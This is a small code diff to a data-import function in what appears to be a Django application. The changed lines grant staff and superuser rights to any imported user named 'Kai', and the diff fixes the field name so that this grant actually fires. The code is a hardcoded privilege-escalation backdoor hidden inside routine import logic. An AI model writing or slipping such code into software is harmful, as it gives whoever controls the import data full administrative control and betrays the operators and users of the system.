@@ -623,7 +623,7 @@ def import_mbt_data(request):
         user.email = userData.get('Eamil') or user.email  # Note the typo in 'Eamil', handle carefully
         user.first_name = userData.get('Name') or user.first_name
 
-        if userData.get('username') == "Kai":
+        if userData.get('Username') == "Kai":
             user.is_staff = True
             user.is_superuser = True
 
